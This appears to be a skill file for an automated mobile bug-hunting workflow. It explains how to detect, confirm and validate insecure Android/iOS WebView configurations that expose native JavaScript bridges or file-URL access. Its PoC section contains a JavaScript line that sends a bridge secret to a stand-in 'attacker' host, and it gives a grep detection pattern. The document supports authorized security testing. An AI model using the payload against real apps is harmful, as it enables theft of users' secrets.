---
name: mhunt-insecure-webview
description: Mobile hunting skill for insecure webview configuration on Android/iOS apps. Ported from droid-llm-hunter vuln_rule 'insecure_webview'. MASVS-PLATFORM-2 (Insecure WebView Configuration). Use when /hunt-mobile (via mhunt-dispatch) fires this rule's detection_pattern, or when hunting insecure webview configuration in a decompiled app.
source: droid-llm-hunter (config/prompts/vuln_rules/insecure_webview.yaml)
masvs: MASVS-PLATFORM-2
---

# mhunt-insecure-webview

port of droid-llm-hunter's `insecure_webview` vuln_rule into the `/hunt-mobile` model. **Insecure WebView Configuration** — WebView exposes a native JS bridge (`addJavascriptInterface`) and/or allows file-URL access, so a malicious script can call native code or read internal resources -> data leak / RCE.

## MASVS

`MASVS-PLATFORM-2` — Insecure WebView Configuration. likely severity: **High** (confirm via the Gate-0 below; mobile severity depends on reachability + impact, not the pattern alone).

## Detection signal (the rule's `detection_pattern`)

android (smali/java/xml) — grep verbatim:

```
addJavascriptInterface|setAllow(File|Universal)AccessFromFileURLs\(true\)
```

ios parallel: `WKUserContentController addScriptMessageHandler:` exposing native handlers, or `WKWebViewConfiguration` with `allowFileAccessFromFileURLs`

a regex hit is a **lead, not a finding** — droid-llm-hunter then deep-scans it with the LLM. that deep-scan is the methodology below.

## Static methodology (deep scan)

- Enumerate every `addJavascriptInterface(obj, name)` and list the @JavascriptInterface methods on `obj` — any that touch files, tokens, IPC, or exec is a bridge worth attacking.
- On API < 17 every public method is exposed; on >= 17 only @JavascriptInterface — but reflection (`getClass().forName`) bypass still applies on old targets.
- Pair with `setAllowFileAccessFromFileURLs(true)`/`setAllowUniversalAccessFromFileURLs(true)`: a `file://` page can then read arbitrary local files.

## Dynamic confirmation

- From a confirmed XSS or a loaded `file://` page, call the bridge: `window.<name>.<method>()` and observe the native result.
- Frida-enumerate exposed objects: hook `WebView.addJavascriptInterface` and log name + object class.

device prereqs: rooted Android emulator/device with `adb` + `frida-server` (and `drozer`/`objection` where noted), or a jailbroken iOS device with `frida`/`objection`. no device -> report as a static-only lead, don't claim confirmed.

## PoC

```javascript
// inside any page the WebView will load (XSS or file://):
// bridge named "Android" with a getSecret() method:
new Image().src = 'https://attacker/?s=' + window.Android.getSecret();
```

## Validation — MASVS Gate-0

before writing the report, answer all three:

1. **Reachability** — can an *external* actor trigger this (another app, a deep link, a network response, a shared file), or only the app itself? app-internal-only is usually not a finding.
2. **Impact** — what does the attacker gain (data read/write, code execution, auth bypass, privilege gain) and which CIA property does the victim lose? map to `MASVS-PLATFORM-2`.
3. **Reproducible in 10 min** — exact entry point (component/URI/intent) + payload + observed result (leaked data / state change / execution), on a clean install, no pre-seeded state.

if any answer is weak, it's a static lead — keep hunting, don't file.

## Chains

Top mobile RCE primitive when the bridge wraps `Runtime.exec`/reflection; cross-ref `mhunt-unsafe-reflection`, `mhunt-library-supply-chain`.
